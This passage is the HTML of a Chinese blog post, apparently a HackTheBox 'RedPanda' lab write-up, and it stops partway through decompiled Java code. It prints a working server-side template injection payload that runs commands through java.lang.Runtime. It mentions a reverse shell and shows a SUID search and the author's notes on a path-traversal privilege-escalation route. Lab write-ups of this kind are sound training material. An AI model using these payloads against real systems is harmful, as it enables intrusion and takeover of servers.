@@ -1,0 +1,618 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>HackTheBox-RedPanda - Mi3aka&#39;s Blog</title><meta name="Description" content="Mi3aka的博客"><meta property="og:title" content="HackTheBox-RedPanda" />
+<meta property="og:description" content="HackTheBox靶机RedPanda" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://mi3aka.eu.org/htb-redpanda/" /><meta property="og:image" content="https://mi3aka.eu.org/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-08-29T14:08:30+00:00" />
+<meta property="article:modified_time" content="2022-08-29T14:08:30+00:00" /><meta property="og:site_name" content="Mi3aka&#39;s Blog" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://mi3aka.eu.org/logo.png"/>
+
+<meta name="twitter:title" content="HackTheBox-RedPanda"/>
+<meta name="twitter:description" content="HackTheBox靶机RedPanda"/>
+<meta name="application-name" content="Mi3aka&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Mi3aka&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://mi3aka.eu.org/htb-redpanda/" /><link rel="prev" href="https://mi3aka.eu.org/htb-support/" /><link rel="next" href="https://mi3aka.eu.org/htb-trick/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "HackTheBox-RedPanda",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/mi3aka.eu.org\/htb-redpanda\/"
+        },"genre": "posts","wordcount":  1516 ,
+        "url": "https:\/\/mi3aka.eu.org\/htb-redpanda\/","datePublished": "2022-08-29T14:08:30+00:00","dateModified": "2022-08-29T14:08:30+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Mi3aka"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Mi3aka&#39;s Blog">Mi3aka</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="/links/"> 友链 </a><a class="menu-item" href="https://github.com/mi3aka/huaQ" rel="noopener noreffer" target="_blank"> Sec </a><a class="menu-item" href="https://tools.mi3aka.eu.org/" rel="noopener noreffer" target="_blank"> Tool </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Mi3aka&#39;s Blog">Mi3aka</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="/links/" title="">友链</a><a class="menu-item" href="https://github.com/mi3aka/huaQ" title="" rel="noopener noreffer" target="_blank">Sec</a><a class="menu-item" href="https://tools.mi3aka.eu.org/" title="" rel="noopener noreffer" target="_blank">Tool</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">HackTheBox-RedPanda</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Mi3aka</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/hackthebox/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>HackTheBox</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-08-29">2022-08-29</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;约 1516 字&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;预计阅读 4 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前期工作">前期工作</a></li>
+    <li><a href="#模板注入获取user权限">模板注入,获取user权限</a></li>
+    <li><a href="#获取root权限">获取root权限</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h2 id="前期工作">前期工作</h2>
+<p>nmap扫描结果</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2022/08/aa9033ebdaf3e1e2eed01710e78200f0.png"
+        data-srcset="https://img.mi3aka.eu.org/2022/08/aa9033ebdaf3e1e2eed01710e78200f0.png, https://img.mi3aka.eu.org/2022/08/aa9033ebdaf3e1e2eed01710e78200f0.png 1.5x, https://img.mi3aka.eu.org/2022/08/aa9033ebdaf3e1e2eed01710e78200f0.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2022/08/aa9033ebdaf3e1e2eed01710e78200f0.png"
+        title="https://img.mi3aka.eu.org/2022/08/aa9033ebdaf3e1e2eed01710e78200f0.png" /></p>
+<h2 id="模板注入获取user权限">模板注入,获取user权限</h2>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2022/08/eae1e19e3e0ed71b124c6068eb14b025.png"
+        data-srcset="https://img.mi3aka.eu.org/2022/08/eae1e19e3e0ed71b124c6068eb14b025.png, https://img.mi3aka.eu.org/2022/08/eae1e19e3e0ed71b124c6068eb14b025.png 1.5x, https://img.mi3aka.eu.org/2022/08/eae1e19e3e0ed71b124c6068eb14b025.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2022/08/eae1e19e3e0ed71b124c6068eb14b025.png"
+        title="https://img.mi3aka.eu.org/2022/08/eae1e19e3e0ed71b124c6068eb14b025.png" /></p>
+<p>题目提示<code>injection</code>,推测为sql注入或者是模板注入</p>
+<p>在测试时发现<code>%</code>被过滤,因此进行fuzz操作,发现<code>%_$~</code>被过滤</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2022/08/1d060b3584f5cc9f3a8d3f6bf8e83fe6.png"
+        data-srcset="https://img.mi3aka.eu.org/2022/08/1d060b3584f5cc9f3a8d3f6bf8e83fe6.png, https://img.mi3aka.eu.org/2022/08/1d060b3584f5cc9f3a8d3f6bf8e83fe6.png 1.5x, https://img.mi3aka.eu.org/2022/08/1d060b3584f5cc9f3a8d3f6bf8e83fe6.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2022/08/1d060b3584f5cc9f3a8d3f6bf8e83fe6.png"
+        title="https://img.mi3aka.eu.org/2022/08/1d060b3584f5cc9f3a8d3f6bf8e83fe6.png" /></p>
+<p>同时发现请求<code>/favicon.ico</code>时返回<code>404</code>json且网页标题提示为<code>Spring Boot</code>,结合过滤的内容,推测为<code>Spring Boot</code>模板注入</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2022/08/971622a78107de97d933882ad1a0d3de.png"
+        data-srcset="https://img.mi3aka.eu.org/2022/08/971622a78107de97d933882ad1a0d3de.png, https://img.mi3aka.eu.org/2022/08/971622a78107de97d933882ad1a0d3de.png 1.5x, https://img.mi3aka.eu.org/2022/08/971622a78107de97d933882ad1a0d3de.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2022/08/971622a78107de97d933882ad1a0d3de.png"
+        title="https://img.mi3aka.eu.org/2022/08/971622a78107de97d933882ad1a0d3de.png" /></p>
+<p>一顿操作后,得到模板注入为<code>*{{xxx}}</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2022/08/7f7144d8ff7071b7aa8ff3959f189261.png"
+        data-srcset="https://img.mi3aka.eu.org/2022/08/7f7144d8ff7071b7aa8ff3959f189261.png, https://img.mi3aka.eu.org/2022/08/7f7144d8ff7071b7aa8ff3959f189261.png 1.5x, https://img.mi3aka.eu.org/2022/08/7f7144d8ff7071b7aa8ff3959f189261.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2022/08/7f7144d8ff7071b7aa8ff3959f189261.png"
+        title="https://img.mi3aka.eu.org/2022/08/7f7144d8ff7071b7aa8ff3959f189261.png" /></p>
+<p>利用<code>name=*{{new+java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;sleep+5&quot;).getInputStream()).next()}}</code>成功执行命令</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2022/08/7fad1e602179aa33e9f8b0a49c5ff971.png"
+        data-srcset="https://img.mi3aka.eu.org/2022/08/7fad1e602179aa33e9f8b0a49c5ff971.png, https://img.mi3aka.eu.org/2022/08/7fad1e602179aa33e9f8b0a49c5ff971.png 1.5x, https://img.mi3aka.eu.org/2022/08/7fad1e602179aa33e9f8b0a49c5ff971.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2022/08/7fad1e602179aa33e9f8b0a49c5ff971.png"
+        title="https://img.mi3aka.eu.org/2022/08/7fad1e602179aa33e9f8b0a49c5ff971.png" /></p>
+<p>直接反弹好像会出问题,把反弹shell命令写成脚本传到服务器上再进行反弹</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2022/08/7e35370c34e98917b62d719a2c219a87.png"
+        data-srcset="https://img.mi3aka.eu.org/2022/08/7e35370c34e98917b62d719a2c219a87.png, https://img.mi3aka.eu.org/2022/08/7e35370c34e98917b62d719a2c219a87.png 1.5x, https://img.mi3aka.eu.org/2022/08/7e35370c34e98917b62d719a2c219a87.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2022/08/7e35370c34e98917b62d719a2c219a87.png"
+        title="https://img.mi3aka.eu.org/2022/08/7e35370c34e98917b62d719a2c219a87.png" /></p>
+<h2 id="获取root权限">获取root权限</h2>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2022/08/0fc87c3919a6ab2cadc6bc2e762c3918.png"
+        data-srcset="https://img.mi3aka.eu.org/2022/08/0fc87c3919a6ab2cadc6bc2e762c3918.png, https://img.mi3aka.eu.org/2022/08/0fc87c3919a6ab2cadc6bc2e762c3918.png 1.5x, https://img.mi3aka.eu.org/2022/08/0fc87c3919a6ab2cadc6bc2e762c3918.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2022/08/0fc87c3919a6ab2cadc6bc2e762c3918.png"
+        title="https://img.mi3aka.eu.org/2022/08/0fc87c3919a6ab2cadc6bc2e762c3918.png" /></p>
+<p><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code>没发现可以利用的点</p>
+<p>pspy监控如下</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2022/08/1508a70491988b9b2c20abd3ee696fef.png"
+        data-srcset="https://img.mi3aka.eu.org/2022/08/1508a70491988b9b2c20abd3ee696fef.png, https://img.mi3aka.eu.org/2022/08/1508a70491988b9b2c20abd3ee696fef.png 1.5x, https://img.mi3aka.eu.org/2022/08/1508a70491988b9b2c20abd3ee696fef.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2022/08/1508a70491988b9b2c20abd3ee696fef.png"
+        title="https://img.mi3aka.eu.org/2022/08/1508a70491988b9b2c20abd3ee696fef.png" /></p>
+<p><code>/opt/cleanup.sh</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>/usr/bin/find /tmp -name <span class="s2">&#34;*.xml&#34;</span> -exec rm -rf <span class="o">{}</span> <span class="se">\;</span>
+</span></span><span class="line"><span class="cl">/usr/bin/find /var/tmp -name <span class="s2">&#34;*.xml&#34;</span> -exec rm -rf <span class="o">{}</span> <span class="se">\;</span>
+</span></span><span class="line"><span class="cl">/usr/bin/find /dev/shm -name <span class="s2">&#34;*.xml&#34;</span> -exec rm -rf <span class="o">{}</span> <span class="se">\;</span>
+</span></span><span class="line"><span class="cl">/usr/bin/find /home/woodenk -name <span class="s2">&#34;*.xml&#34;</span> -exec rm -rf <span class="o">{}</span> <span class="se">\;</span>
+</span></span><span class="line"><span class="cl">/usr/bin/find /tmp -name <span class="s2">&#34;*.jpg&#34;</span> -exec rm -rf <span class="o">{}</span> <span class="se">\;</span>
+</span></span><span class="line"><span class="cl">/usr/bin/find /var/tmp -name <span class="s2">&#34;*.jpg&#34;</span> -exec rm -rf <span class="o">{}</span> <span class="se">\;</span>
+</span></span><span class="line"><span class="cl">/usr/bin/find /dev/shm -name <span class="s2">&#34;*.jpg&#34;</span> -exec rm -rf <span class="o">{}</span> <span class="se">\;</span>
+</span></span><span class="line"><span class="cl">/usr/bin/find /home/woodenk -name <span class="s2">&#34;*.jpg&#34;</span> -exec rm -rf <span class="o">{}</span> <span class="se">\;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>/opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//
+</span></span></span><span class="line"><span class="cl"><span class="c1">// Source code recreated from a .class file by IntelliJ IDEA
+</span></span></span><span class="line"><span class="cl"><span class="c1">// (powered by FernFlower decompiler)
+</span></span></span><span class="line"><span class="cl"><span class="c1">//
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="kn">package</span> <span class="nn">com.logparser</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.drew.imaging.jpeg.JpegMetadataReader</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.drew.imaging.jpeg.JpegProcessingException</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.drew.metadata.Directory</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.drew.metadata.Metadata</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.drew.metadata.Tag</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.BufferedWriter</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.File</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.FileWriter</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.util.HashMap</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.util.Iterator</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.util.Map</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.util.Scanner</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.jdom2.Document</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.jdom2.Element</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.jdom2.JDOMException</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.jdom2.input.SAXBuilder</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.jdom2.output.Format</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.jdom2.output.XMLOutputter</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">App</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="nf">App</span><span class="o">()</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="n">Map</span> <span class="nf">parseLog</span><span class="o">(</span><span class="n">String</span> <span class="n">line</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">String</span><span class="o">[]</span> <span class="n">strings</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="na">split</span><span class="o">(</span><span class="s">&#34;\\|\\|&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Map</span> <span class="n">map</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&#34;status_code&#34;</span><span class="o">,</span> <span class="n">Integer</span><span class="o">.</span><span class="na">parseInt</span><span class="o">(</span><span class="n">strings</span><span class="o">[</span><span class="mi">0</span><span class="o">]));</span>
+</span></span><span class="line"><span class="cl">        <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&#34;ip&#34;</span><span class="o">,</span> <span class="n">strings</span><span class="o">[</span><span class="mi">1</span><span class="o">]);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&#34;user_agent&#34;</span><span class="o">,</span> <span class="n">strings</span><span class="o">[</span><span class="mi">2</span><span class="o">]);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&#34;uri&#34;</span><span class="o">,</span> <span class="n">strings</span><span class="o">[</span><span class="mi">3</span><span class="o">]);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">map</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">boolean</span> <span class="nf">isImage</span><span class="o">(</span><span class="n">String</span> <span class="n">filename</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">filename</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="s">&#34;.jpg&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">getArtist</span><span class="o">(</span><span class="n">String</span> <span class="n">uri</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">JpegProcessingException</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">fullpath</span> <span class="o">=</span> <span class="s">&#34;/opt/panda_search/src/main/resources/static&#34;</span> <span class="o">+</span> <span class="n">uri</span><span class="o">;</span><span class="c1">//目录穿越,注意这里没有使用/进行闭合
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">File</span> <span class="n">jpgFile</span> <span class="o">=</span> <span class="k">new</span> <span class="n">File</span><span class="o">(</span><span class="n">fullpath</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Metadata</span> <span class="n">metadata</span> <span class="o">=</span> <span class="n">JpegMetadataReader</span><span class="o">.</span><span class="na">readMetadata</span><span class="o">(</span><span class="n">jpgFile</span><span class="o">);</span><span class="c1">//文件必须为jpg
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">Iterator</span> <span class="n">var4</span> <span class="o">=</span> <span class="n">metadata</span><span class="o">.</span><span class="na">getDirectories</span><span class="o">().</span><span class="na">iterator</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">while</span><span class="o">(</span><span class="n">var4</span><span class="o">.</span><span class="na">hasNext</span><span class="o">())</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">Directory</span> <span class="n">dir</span> <span class="o">=</span> <span class="o">(</span><span class="n">Directory</span><span class="o">)</span><span class="n">var4</span><span class="o">.</span><span class="na">next</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">            <span class="n">Iterator</span> <span class="n">var6</span> <span class="o">=</span> <span class="n">dir</span><span class="o">.</span><span class="na">getTags</span><span class="o">().</span><span class="na">iterator</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="k">while</span><span class="o">(</span><span class="n">var6</span><span class="o">.</span><span class="na">hasNext</span><span class="o">())</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">Tag</span> <span class="n">tag</span> <span class="o">=</span> <span class="o">(</span><span class="n">Tag</span><span class="o">)</span><span class="n">var6</span><span class="o">.</span><span class="na">next</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="o">(</span><span class="n">tag</span><span class="o">.</span><span class="na">getTagName</span><span class="o">()</span> <span class="o">==</span> <span class="s">&#34;Artist&#34;</span><span class="o">)</span> <span class="o">{</span><span class="c1">//利用exiftools构建图片,手动指定Artist的值
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="k">return</span> <span class="n">tag</span><span class="o">.</span><span class="na">getDescription</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">                <span class="o">}</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s">&#34;N/A&#34;</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
